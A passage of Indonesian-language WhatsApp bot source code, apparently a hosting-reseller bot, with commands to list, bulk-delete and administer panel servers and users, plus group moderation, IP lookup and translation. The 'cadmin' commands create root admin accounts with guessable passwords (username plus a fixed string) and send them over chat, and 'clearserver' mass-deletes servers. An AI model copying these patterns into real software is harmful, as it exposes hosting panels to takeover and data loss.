            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 2: ' + error.message);
    }
    break;
}

case 'clearserver3': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver3 , 301, 302, 303');
    }

    try {
        // Mendapatkan daftar server dari server 3
        let f = await fetch(global.domain3 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 3.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain3 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 3 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 3: ' + error.message);
    }
    break;
}

case 'setnamagb':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await cupen.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan nama grup baru!\nContoh: .setname Nama Grup Baru');

 try {
 await cupen.groupUpdateSubject(m.chat, text); // Ganti nama grup
 m.reply(`Berhasil mengganti nama grup menjadi: *${text}*`);
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti nama grup. Pastikan bot memiliki izin sebagai admin.');
 }
}
break;

case 'setppgb': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await cupen.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 // Periksa apakah ada gambar (bisa dari reply atau teks URL)
 let media;
 if (m.quoted && m.quoted.imageMessage) {
 media = await cupen.downloadMediaMessage(m.quoted); // Ambil media dari reply
 } else if (text) {
 media = text; // Ambil URL gambar dari input teks
 } else {
 return m.reply('Kirim atau reply ke gambar, atau masukkan URL gambar untuk mengganti foto grup.');
 }

 try {
 await cupen.updateProfilePicture(m.chat, { url: media }); // Set foto grup
 m.reply('Berhasil mengganti foto profil grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti foto profil grup. Pastikan gambar valid dan sesuai.');
 }
}
break;

case 'closegroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await cupen.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await cupen.groupSettingUpdate(m.chat, 'announcement');
 m.reply('Grup telah ditutup. Hanya admin yang dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal menutup grup.');
 }
}
break;

case 'opengroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await cupen.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await cupen.groupSettingUpdate(m.chat, 'not_announcement');
 m.reply('Grup telah dibuka. Semua anggota dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal membuka grup.');
 }
}
break;

case 'setdeks':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await cupen.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan deskripsi baru untuk grup!');
 try {
 await cupen.groupUpdateDescription(m.chat, text);
 m.reply('Berhasil mengganti deskripsi grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengubah deskripsi grup.');
 }
}
break;

case 'hidetag': {
 if (!m.isGroup) return Reply(mess.group);
 if (!isCreator && !m.isAdmin) return Reply(mess.admin);
 if (!text) return m.reply("Masukkan pesan yang ingin Anda kirimkan untuk men-tag semua anggota grup.");

 // Ambil metadata grup
 const groupMetadata = await cupen.groupMetadata(m.chat);
 if (!groupMetadata || !groupMetadata.participants) {
 return m.reply("Gagal mengambil data anggota grup.");
 }

 let member = groupMetadata.participants.map(v => v.id);
 await cupen.sendMessage(m.chat, {text: text, mentions: member}, {quoted: m});
}
break

case 'kick': {
 if (!m.isGroup) return Reply(mess.group); // Pastikan perintah ini dijalankan di grup
 if (!isCreator && !m.isAdmin) return Reply(mess.admin); // Pastikan pengirim adalah admin atau creator grup
 
 // Mendapatkan ID pengguna yang akan dikeluarkan
 let userToKick = m.mentionedJid[0]; // Mengambil ID pengguna yang disebutkan
 if (!userToKick) return m.reply("Tag pengguna yang ingin dikeluarkan!"); // Pastikan pengguna ditandai
 
 // Melakukan kick atau mengeluarkan pengguna dari grup
 try {
 await cupen.groupParticipantsUpdate(m.chat, [userToKick], 'remove'); // Mengeluarkan anggota
 m.reply(`Pengguna @${userToKick.split('@')[0]} berhasil dikeluarkan dari grup.`, null, { mentions: [userToKick] });
 } catch (error) {
 console.error(error);
 m.reply("Gagal mengeluarkan pengguna dari grup.");
 }
}
break

case 'linkgc':
{
 if (!m.isGroup) return m.reply("Perintah ini hanya dapat digunakan di grup.");
 if (!isCreator && !m.isAdmin) return m.reply("Perintah ini hanya untuk admin grup.");
 
 try {
 // Pastikan metadata grup sudah ada
 const groupMetadata = await cupen.groupMetadata(m.chat);
 if (!groupMetadata) throw "Gagal mendapatkan metadata grup.";
 
 // Ambil kode undangan grup
 const inviteCode = await cupen.groupInviteCode(m.chat);
 const groupLink = `https://chat.whatsapp.com/${inviteCode}`;
 m.reply(`┌───「 *❀SalwaCantik❀* 」───
│ *Link Group* : ${groupLink}
└───────────────────`);
 } catch (err) {
 console.error(err); // Log error ke konsol
 m.reply("Gagal mendapatkan link grup. Pastikan bot adalah admin dan grup memiliki kode undangan aktif.");
 }
}
break;


case 'cekip':
if (!text) return m.reply("Masukkan IP address atau domain yang ingin dicek! Contoh: 8.8.8.8 atau google.com");
 
 try {
 // Lakukan request ke API untuk mendapatkan detail IP
 const response = await axios.get(`https://ipapi.co/${text}/json/`);
 const data = response.data;

 // Cek apakah data berhasil ditemukan
 if (data.error) return m.reply(`IP atau domain tidak ditemukan: ${text}`);

 // Format pesan hasil
 const message = `
🌐 **Informasi IP**
- **IP Address**: ${data.ip || "Tidak diketahui"}
- **Kota**: ${data.city || "Tidak diketahui"}
- **Wilayah**: ${data.region || "Tidak diketahui"}
- **Negara**: ${data.country_name || "Tidak diketahui"} (${data.country || "?"})
- **Kode Pos**: ${data.postal || "Tidak diketahui"}
- **Provider**: ${data.org || "Tidak diketahui"}
- **Latitude**: ${data.latitude || "Tidak diketahui"}
- **Longitude**: ${data.longitude || "Tidak diketahui"}
 `.trim();

 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat memproses permintaan. Pastikan IP atau domain valid, lalu coba lagi.");
 }
 break;

case 'translate': {
 if (!text) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");
 
 const args = text.split(' ');
 const targetLang = args.shift();
 const query = args.join(' ');

 if (!targetLang || !query) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");

 m.reply("Sedang menerjemahkan...");
 
 try {
 const response = await axios.post('https://translate.googleapis.com/translate_a/single', null, {
 params: {
 client: 'gtx',
 sl: 'auto',
 tl: targetLang,
 dt: 't',
 q: query,
 },
 });

 const translation = response.data[0][0][0];
 m.reply(`Hasil terjemahan:\n${translation}`);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat menerjemahkan teks. Pastikan format dan kode bahasa sudah benar.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'fiturnew': {
 if (fiturNew.fitur.length === 0) {
 return m.reply("Tidak ada fitur baru yang ditambahkan.");
 }

 // Format daftar fitur baru untuk ditampilkan
 let message = "🌟 *Fitur Terbaru yang Ditambahkan* 🌟\n\n";
 fiturNew.fitur.forEach((fitur, index) => {
 message += `${index + 1}. ${fitur}\n`;
 });

 m.reply(message);
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'addfitur': {
 if (!isPrem && !isCreator) return m.reply("❌ Hanya admin atau developer yang dapat menambahkan fitur baru.");
 
 if (!text) return m.reply(`Contoh: ${prefix + command} nama_fitur_baru`);

 let fiturBaru = text.trim();

 if (fiturNew.fitur.includes(fiturBaru)) {
 return m.reply("⚠️ Fitur ini sudah ada dalam daftar fitur terbaru.");
 }

 fiturNew.fitur.push(fiturBaru);

 // Simpan perubahan ke file fiturnew.json
 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply(`✅ Fitur "${fiturBaru}" berhasil ditambahkan ke daftar fitur terbaru.`);
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menyimpan daftar fitur baru.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearfitur': {
 if (!isPrem && !isCreator) return m.reply("❌ Hanya admin atau developer yang dapat menghapus daftar fitur.");

 fiturNew.fitur = [];

 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply("✅ Daftar fitur terbaru berhasil dihapus.");
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menghapus daftar fitur.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'updomain2':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain2 = newteks;

 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'upapikey2':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey2 = newteks;
 return cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'upcapikey2':{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey2 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'cadmin2':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');

 let username, nomornya;

 if (m.quoted && !q.includes('-')) {
 // Opsi 1: Dengan Reply Pesan
 username = q.trim();
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin2 username (dengan reply pesan)`);
 
 nomornya = m.quoted.sender; // Nomor dari pengirim pesan yang di-reply
 } else if (q.includes('-')) {
 // Opsi 2: Dengan format username-nomor atau username-mention
 let [nameInput, nomorInput] = q.split('-').map(v => v.trim());
 username = nameInput;
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin2 username-nomor\n.cadmin2 username-@tag`);

 // Cek apakah input menggunakan mention atau nomor
 nomornya = nomorInput.includes('@') 
 ? m.mentionedJid && m.mentionedJid[0] 
 : nomorInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 } else {
 return m.reply(`*Format salah!*\nPenggunaan:\n.cadmin2 username (dengan reply pesan)\n.cadmin2 username-nomor/mention`);
 }

 if (!nomornya) return m.reply(`*Nomor tidak valid!*\nContoh penggunaan:\n.cadmin2 username-6289502445574\n.cadmin2 username-@taguser`);

 let email = `${username}@gmail.com`;
 let password = username + "❀SalwaCantik❀"; // Password dibuat dari username + string tambahan

 try {
 // =======================
 // Buat Admin di Server 2
 // =======================
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: "Admin",
 language: "en",
 root_admin: true, // User di-set sebagai admin
 password: password.toString()
 })
 });

 let data = await f.json();
 if (data.errors) return m.reply(`❌ Gagal membuat admin di server 2!\n${JSON.stringify(data.errors[0], null, 2)}`);

 let user = data.attributes;

 // =======================
 // Kirim Pesan Konfirmasi
 // =======================
 let tks = `*_Admin untuk Server 2 telah dibuat dan datanya telah dikirim ✅_*`;
 await cupen.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video 
 const thumbnailUrl = 'https://files.catbox.moe/fh0a6r.jpg'; // URL thumbnail (opsional)

 // =======================
 // Kirim Detail Akun ke Nomor Target
 // =======================
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*
`;

 await cupen.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Admin berhasil dibuat di server 2 dan detailnya telah dikirim ke nomor ${nomornya.split('@')[0]}`);
 } catch (error) {
 console.error(error);
 m.reply('❌ Terjadi kesalahan saat membuat admin di server 2. Silakan coba lagi.');
 }
 break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'cadmin3':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');

 let username, nomornya;

 if (m.quoted && !q.includes('-')) {
 // Opsi 1: Dengan Reply Pesan
 username = q.trim();
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin3 username (dengan reply pesan)`);
 
 nomornya = m.quoted.sender; // Nomor dari pengirim pesan yang di-reply
 } else if (q.includes('-')) {
 // Opsi 2: Dengan format username-nomor atau username-mention
 let [nameInput, nomorInput] = q.split('-').map(v => v.trim());
 username = nameInput;
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin3 username-nomor\n.cadmin3 username-@tag`);

 // Cek apakah input menggunakan mention atau nomor
 nomornya = nomorInput.includes('@') 
 ? m.mentionedJid && m.mentionedJid[0] 
 : nomorInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 } else {
 return m.reply(`*Format salah!*\nPenggunaan:\n.cadmin3 username (dengan reply pesan)\n.cadmin3 username-nomor/mention`);
 }

 if (!nomornya) return m.reply(`*Nomor tidak valid!*\nContoh penggunaan:\n.cadmin3 username-6289502445574\n.cadmin3 username-@taguser`);

 let email = `${username}@gmail.com`;
 let password = username + "❀SalwaCantik❀"; // Password dibuat dari username + string tambahan

 try {
 // =======================
 // Buat Admin di Server 3
 // =======================
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: "Admin",
 language: "en",
 root_admin: true, // User di-set sebagai admin
 password: password.toString()
 })
 });

 let data = await f.json();
 if (data.errors) return m.reply(`❌ Gagal membuat admin di server 3!\n${JSON.stringify(data.errors[0], null, 2)}`);

 let user = data.attributes;

 // =======================
 // Kirim Pesan Konfirmasi
 // =======================
 let tks = `*_Admin untuk Server 3 telah dibuat dan datanya telah dikirim ✅_*`;
 await cupen.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video 
 const thumbnailUrl = 'https://files.catbox.moe/fh0a6r.jpg'; // URL thumbnail (opsional)

 // =======================
 // Kirim Detail Akun ke Nomor Target
 // =======================
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*
`;

 await cupen.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Admin berhasil dibuat di server 3 dan detailnya telah dikirim ke nomor ${nomornya.split('@')[0]}`);
 } catch (error) {
 console.error(error);
 m.reply('❌ Terjadi kesalahan saat membuat admin di server 3. Silakan coba lagi.');
 }
 break;
}

case 'listadmin2':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain2 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 2 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 2*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 2.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listserver2':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input

 try {
 let f = await fetch(global.domain2 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 2.");
 }

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video atau GIF

 let teks = `╭─❒ *List Server di Server 2*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀ - List Server 2',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 2.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listserver3':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(global.domain3 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Cek jika API mengembalikan error
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 3.");
 }

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video/GIF

 let teks = `╭─❒ *List Server di Server 3*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description || 'Tidak ada deskripsi'}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan dengan multimedia
 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀ - List Server 3',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 3.");
 }
 break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listuser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    
    let page = parseInt(args[0]) || 1; // Halaman default ke 1 jika tidak ada input
    
    try {
        let f = await fetch(global.domain3 + "/api/application/users?page=" + page, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res = await f.json();

        // Jika terjadi error pada respons API
        if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);

        let users = res.data;
        if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 3.");

        // Format pesan daftar user
        let messageText = "*Berikut adalah daftar pengguna di Server 3:*\n\n";
        for (let user of users) {
            let u = user.attributes;
            messageText += `🆔 *ID*: ${u.id}\n`;
            messageText += `🔹 *Username*: ${u.username}\n`;
            messageText += `📛 *Nama*: ${u.first_name} ${u.last_name}\n`;
            messageText += `📊 *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
            messageText += `-----------------------------\n`;
        }

        messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `👤 *Total User*: ${res.meta.pagination.total}\n`;

        // Kirim pesan
        await cupen.sendMessage(m.chat, { text: messageText }, { quoted: m });

        // Navigasi ke halaman berikutnya
        if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
            m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
        }
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil data user di server 3.");
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listadmin3':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain3 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 3 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 3*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
